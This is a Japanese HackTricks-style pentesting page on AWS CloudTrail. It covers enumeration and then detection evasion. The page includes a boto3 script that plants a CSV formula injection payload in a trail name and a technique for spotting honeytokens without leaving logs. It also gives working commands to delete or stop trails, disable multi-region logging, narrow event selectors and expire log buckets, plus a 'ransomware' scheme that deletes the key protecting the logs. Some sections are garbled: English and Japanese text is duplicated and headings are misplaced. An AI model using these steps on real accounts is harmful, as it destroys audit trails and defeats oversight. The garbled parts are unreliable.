# AWS - CloudTrail Enum

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSやHackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## **CloudTrail**

このサービスは、環境内で行われたAWS API呼び出しを追跡・監視します。各API呼び出し（イベント）はログに記録されます。各ログイベントには以下が含まれます：

* 呼び出されたAPIの名前：`eventName`
* 呼び出されたサービス：`eventSource`
* 時間：`eventTime`
* IPアドレス：`SourceIPAddress`
* エージェントメソッド：`userAgent`。例：
  * Signing.amazonaws.com - AWS Management Consoleから
  * console.amazonaws.com - アカウントのルートユーザー
  * lambda.amazonaws.com - AWS Lambdaから
* リクエストパラメータ：`requestParameters`
* レスポンス要素：`responseElements`

イベントは、**約5分ごとにJSONファイルに書き込まれ**、CloudTrailによって保持され、最終的にログファイルは**約15分後にS3に配信されます**。\
CloudTrailのログは、アカウント間およびリージョン間で**集約することができます**。\
CloudTrailは、ログファイルの整合性を使用して、CloudTrailがログファイルを配信した後もログファイルが変更されていないことを検証できるようにします。ログ内のSHA-256ハッシュをダイジェストファイルに作成します。新しいログのSHA-256ハッシュは1時間ごとに作成されます。\
Trailを作成する際、イベントセレクタを使用して、ログするトレイル（管理、データ、洞察イベント）を指定できます。

ログはS3バケットに保存されます。デフォルトでは、サーバーサイド暗号化（SSE-S3）が使用されるため、AWSはアクセス権を持つ人々に対してコンテンツを復号化しますが、追加のセキュリティのためにSSE with KMSと独自のキーを使用することもできます。

### ログファイルの命名規則

![](<../../../../.gitbook/assets/image (29).png>)

### S3フォルダの構造

![](<../../../../.gitbook/assets/image (47).png>)

フォルダ "_AWSLogs_" と "_CloudTrail_" は固定のフォルダ名であることに注意してください。

**ダイジェスト**ファイルには、似たようなフォルダのパスがあります：

![](<../../../../.gitbook/assets/image (22).png>)

### 複数のアカウントからログを集約する

* ログファイルを配信するAWSアカウントでトレイルを作成します
* CloudTrailのクロスアカウントアクセスを許可し、アクセスが必要な各AWSアカウントに対して宛先S3バケットへのアクセス権限を適用します
* 他のAWSアカウントで新しいトレイルを作成し、ステップ1で作成したバケットを使用するように選択します

ただし、同じS3バケットにすべてのログを保存できる場合でも、複数のアカウントのCloudTrailログを単一のAWSアカウントに所属するCloudWatch Logsに集約することはできません。

### 組織のすべてのアカウントから1つにCloudtrailを作成する

CloudTrailを作成する際、組織のすべてのアカウントでCloudTrailをアクティブにし、ログを1つのバケットに取得することができます：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

これにより、すべてのアカウントのすべてのリージョンでCloudTrailを簡単に構成し、ログを1つのアカウント（保護する必要があります）に集約することができます。

### ログファイルのチェック

ログが改ざんされていないことを確認するために、次のコマンドを実行できます。
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### CloudWatchへのログ送信

**CloudTrailは、ログを自動的にCloudWatchに送信することができます。これにより、不審なアクティビティが行われた場合に警告を受けるアラートを設定することができます。**\
CloudTrailがログをCloudWatchに送信するためには、そのアクションを許可するための**ロール**を作成する必要があります。可能であれば、これらのアクションを実行するためにAWSのデフォルトロールを使用することを推奨します。このロールにより、CloudTrailは以下の操作を許可します。

* CreateLogStream：CloudWatch Logsのログストリームを作成することができます。
* PutLogEvents：CloudTrailのログをCloudWatch Logsのログストリームに配信することができます。

### イベント履歴

CloudTrailイベント履歴では、記録されたログをテーブルで確認することができます。

![](<../../../../.gitbook/assets/image (24).png>)

### インサイト

**CloudTrailインサイト**は、CloudTrailトレイルからの書き込み管理イベントを自動的に**分析**し、**異常なアクティビティ**について**アラート**を表示します。たとえば、`TerminateInstance`イベントの増加が既定のベースラインと異なる場合、それをインサイトイベントとして表示します。これにより、異常なAPIアクティビティの検出と対応がこれまで以上に容易になります。

### セキュリティ

| CloudTrailログファイルの整合性        | <ul><li>ログが改ざんされていないか（変更または削除されていないか）を検証します</li><li><p>ダイジェストファイルを使用します（各ファイルにハッシュを作成）</p><ul><li>SHA-256ハッシュ</li><li>デジタル署名用のSHA-256 with RSA</li><li>Amazonが所有する秘密鍵</li></ul></li><li>ダイジェストファイルの作成には1時間かかります（毎時の時間に実行されます）</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 不正アクセスの防止             | <ul><li><p>IAMポリシーとS3バケットポリシーを使用します</p><ul><li>セキュリティチーム —> 管理者アクセス</li><li>監査人 —> 読み取り専用アクセス</li></ul></li><li>ログを暗号化するためにSSE-S3/SSE-KMSを使用します</li></ul>                                                                                                                                        |
| ログファイルの削除防止 | <ul><li>IAMおよびバケットポリシーで削除アクセスを制限します</li><li>S3 MFA削除を構成します</li><li>ログファイルの検証を行います</li></ul>                                                                                                                                                                                            |

## アクション

### 列挙
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSVインジェクション**

CloudTrail内でCSVインジェクションを実行することが可能であり、ログがCSV形式でエクスポートされ、Excelで開かれた場合に任意のコードが実行される可能性があります。\
以下のコードは、ペイロードを含む不正なトレイル名を持つログエントリを生成します。
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
CSVインジェクションについての詳細は、次のページを参照してください：

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

この特定のテクニックについての詳細については、[https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)を参照してください。

## **検出を回避する**

### ハニートークンのバイパス

ハニートークンは、**機密情報の持ち出しを検出**するために作成されます。AWSの場合、**AWSキーは監視される**ため、そのキーを使用して何かがトリガーされると、誰かがそのキーを盗んだということになります。

ただし、この監視は**CloudTrail**を介して行われ、一部のAWSサービスはCloudTrailにログを送信しない（[ここでリストを見つける](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)）。これらのサービスのいくつかは、認可されていない人（ハニートークンキー）がアクセスしようとすると、**キーロールのARNを含むエラー**を返します。

これにより、**攻撃者はログをトリガーせずにキーのARNを取得**することができます。ARNでは、攻撃者は**AWSアカウントIDと名前**を見ることができます。ハニートークンの会社のアカウントIDと名前は簡単に特定できるため、攻撃者はトークンがハニートークンであるかどうかを判断できます。

![](<../../../../.gitbook/assets/image (65).png>)

[**このスクリプト**](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)または[**Pacu**](https://github.com/RhinoSecurityLabs/pacu)は、キーが**Canarytokens**または**SpaceCrab**に属しているかどうかを検出します。

{% hint style="danger" %}
Pacuとスクリプトで使用されているAPIは現在キャッチされているため、**新しいものを見つける必要があります**。\
新しいものを見つけるには、[https://canarytokens.org/generate](https://canarytokens.org/generate)でキャナリートークンを生成することができます。
{% endhint %}

詳細については、[**オリジナルの研究**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)を参照してください。

### トレイルの削除
```bash
aws cloudtrail delete-trail --name [trail-name]
```
### トレイルの停止

To stop a trail, use the `stop-logging` command followed by the name of the trail you want to stop.

トレイルを停止するには、`stop-logging`コマンドを使用し、停止したいトレイルの名前を指定します。

```bash
aws cloudtrail stop-logging --name <trail-name>
```

Replace `<trail-name>` with the actual name of the trail you want to stop.

`<trail-name>`を停止したいトレイルの実際の名前に置き換えてください。

### Delete trails

### トレイルの削除

To delete a trail, use the `delete-trail` command followed by the name of the trail you want to delete.

トレイルを削除するには、`delete-trail`コマンドを使用し、削除したいトレイルの名前を指定します。

```bash
aws cloudtrail delete-trail --name <trail-name>
```

Replace `<trail-name>` with the actual name of the trail you want to delete.

`<trail-name>`を削除したいトレイルの実際の名前に置き換えてください。
```bash
aws cloudtrail stop-logging --name [trail-name]
```
### マルチリージョンのログ記録を無効にする

By default, AWS CloudTrail logs events from all regions in your AWS account. However, in some cases, you may want to disable multi-region logging for specific reasons, such as reducing costs or improving performance. To disable multi-region logging in AWS CloudTrail, follow the steps below:

1. Open the AWS Management Console and navigate to the CloudTrail service.
2. Select the trail for which you want to disable multi-region logging.
3. Click on the "Edit" button.
4. In the "Trail settings" section, scroll down to the "Management events" section.
5. Toggle the switch next to "Enable log file validation" to disable it.
6. Scroll down to the "Advanced" section.
7. Toggle the switch next to "Enable multi-region" to disable it.
8. Click on the "Save" button to apply the changes.

After following these steps, AWS CloudTrail will no longer log events from regions other than the region where the trail is created. Keep in mind that disabling multi-region logging may limit your visibility into events occurring in other regions.
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
### イベントセレクタによるログ記録の無効化

{% code overflow="wrap" %}
```bash
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>
```
{% endcode %}

この例では、単一のイベントセレクタがJSON配列として提供され、単一のオブジェクトとして指定されています。 `"ReadWriteType": "ReadOnly"` は、イベントセレクタが読み取り専用のイベントのみをキャプチャするようにすることを示しています。特定の要件に基づいてイベントセレクタをカスタマイズすることができます。

### S3ライフサイクルポリシーによるログの削除

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### バケットの変更

* S3バケットを削除する
* バケットポリシーを変更して、CloudTrailサービスからの書き込みを拒否する
* S3バケットにライフサイクルポリシーを追加してオブジェクトを削除する
* CloudTrailログを暗号化するために使用されるKMSキーを無効にする

### CloudTrail "ランサムウェア"

**非対称キーを生成**し、CloudTrailがそのキーでデータを暗号化し、**秘密鍵を削除**することで、CloudTrailの内容を回復できなくすることができます。

![](https://lh6.googleusercontent.com/DRckYJKCAVyDeUY6cganqHTcfvlRMrOcnInUx25f9s9rstNvvkXbu-OS2ZozMvh0Oqxdc9Ehrsc8QJTVGZkbDih\_zsjU2KRvHVGahLqbfAhnD0VLdk096xPNJuAebOJYtDZ71SlnJt6rQj0\_3Q)

![](https://lh3.googleusercontent.com/GfGI0jCdTe2S2HNVMKdNaltBfv9ls6lZqSQt1FkR8mgcxKNdvVmAE2vl77Sr23KWJ6X7-X4UJVgkN5KsQxYEdqOTIWwjr6DHCK9s\_iw5whQkN\_TVPOycc2qHZUSU9NED\_k2lEYK4SpavbTxZ6w)

![](https://lh5.googleusercontent.com/Y9iLLB5RtmBoBVrLE9GKkGK6mxGWtAL6oSwVxgwqYxYHkXpimUZJmAT\_AkxQW-hpdz2kaHpaqXXHwvzz3osg-JA5i1c8\_bWoz5HlTj0mup0MAvG6B5IAnnsnvIDtpqflW4UzIOKZYDxxdxUSDQ)

## **参考文献**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
